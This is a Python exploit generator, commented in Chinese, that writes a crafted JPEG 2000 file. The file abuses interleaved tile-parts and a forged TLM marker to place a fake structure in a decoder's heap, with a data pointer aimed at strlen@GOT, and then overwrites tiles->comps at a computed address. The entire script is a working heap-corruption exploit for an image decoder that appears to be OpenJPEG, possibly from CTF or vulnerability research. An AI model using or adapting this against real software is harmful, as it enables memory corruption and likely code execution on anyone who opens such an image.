import struct
import sys

# mk_inter.py <模板> <out> <NB0> <KTARGET> <BIGTILE>
#   布局（关键：tile-part 可交错）:
#     tile0 part0            payload = fake(112B)      => tile0.m_data = 112B，留在 brk
#     tile0 part1..K-1       payload = 0                => tile0.m_data 不增长
#     tile<BIGTILE> part0    payload = 大填充            => 只撑大它自己的 m_data
#     tile0 partK            SOT 落在目标偏移(= m_data 地址) => 写入 tiles->comps
#   目标值 = tell-2 = (SOT偏移+0xe)-2 = SOT偏移+0xc

TPL, OUT = sys.argv[1], sys.argv[2]
NB0 = int(sys.argv[3]) if len(sys.argv) > 3 else 23
K = int(sys.argv[4]) if len(sys.argv) > 4 else 24
BIGTILE = int(sys.argv[5]) if len(sys.argv) > 5 else 1

d = open(TPL, 'rb').read()
soc = d.find(b'\xff\x4f')
si = d.find(b'\xff\x51', soc)
siz_end = si + 2 + struct.unpack('>H', d[si + 2:si + 4])[0]
orig_tlm = d.find(b'\xff\x55', soc)
orig_tlm_end = orig_tlm + 2 + struct.unpack('>H', d[orig_tlm + 2:orig_tlm + 4])[0]
first_sot = d.find(b'\xff\x90', soc)
mid = d[orig_tlm_end:first_sot]

fake = bytearray(0x70)
struct.pack_into('<iiii', fake, 0x00, 0, 0, 16, 16)
struct.pack_into('<I', fake, 0x14, 1)          # numresolutions
struct.pack_into('<I', fake, 0x18, 1)          # minimum_num_resolutions
struct.pack_into('<Q', fake, 0x20, 0)          # resolutions = NULL
struct.pack_into('<I', fake, 0x28, 1)
struct.pack_into('<Q', fake, 0x30, 0xa20f70)   # data = strlen@GOT
struct.pack_into('<I', fake, 0x38, 0)
struct.pack_into('<Q', fake, 0x40, 0)
struct.pack_into('<Q', fake, 0x48, 0x1000)     # data_size 大值
struct.pack_into('<Q', fake, 0x50, 0)
struct.pack_into('<Q', fake, 0x68, 256)
fake = bytes(fake)

ntiles = 4
ents = b''
for t in range(ntiles):
    for _ in range(NB0 if t == 0 else 1):
        ents += bytes([t]) + struct.pack('>H', 1)
TLM = b'\xff\x55' + struct.pack('>H', 4 + len(ents)) + bytes([0, 0x10]) + ents

buf = bytearray(d[:siz_end]) + bytearray(TLM) + bytearray(mid)


def emit(tp, pay, tile=0):
    psot = 12 + 2 + len(pay)
    buf.extend(b'\xff\x90' + struct.pack('>H', 10) + struct.pack('>H', tile) +
               struct.pack('>I', psot) + bytes([tp, 0]))
    buf.extend(b'\xff\x93')
    buf.extend(pay)


# tile0 part0 -> fake 进 m_data
emit(0, fake)
# tile0 part1..K-1 -> 空 payload
for tp in range(1, K):
    emit(tp, b'')

# 记录：tile<BIGTILE> 的 SOT 现在的位置
big_sot = len(buf)
# 大填充：让 tile0 partK 的 SOT 恰好落在 TARGET = big_sot + fill + 14
# 先按 0 算，稍后 TARGET 反算不了（取决于 m_data 地址）→ 由调用者给
TARGET = int(sys.argv[6], 0) if len(sys.argv) > 6 else 0
if not TARGET:
    sys.exit('need TARGET (m_data address + 0xc)')

# 大填充长度：tile<BIGTILE> 的 payload 覆盖到 TARGET-14
fill = TARGET - big_sot - 14
if fill < 0:
    sys.exit('fill negative: %d' % fill)
emit(0, b'F' * fill, tile=BIGTILE)

assert len(buf) == TARGET, 'big part ends at %#x want %#x' % (len(buf), TARGET)
# 这一发的 SOT 就在 TARGET => tell = TARGET+0xe => end_header = TARGET+0xc
emit(K, b'')

for t in (2, 3):
    if t != BIGTILE:
        emit(0, b'', tile=t)
buf.extend(b'\xff\xd9')
open(OUT, 'wb').write(bytes(buf))
print('OK len=%d(%#x) SOT(K=%d)@%#x 写入值=tell-2=%#x (target m_data+0xc)' %
      (len(buf), len(buf), K, TARGET, TARGET + 0xc))
print('若 m_data=%#x，则 comps 会被写成 %#x' % (TARGET - 0xc, TARGET + 0xc))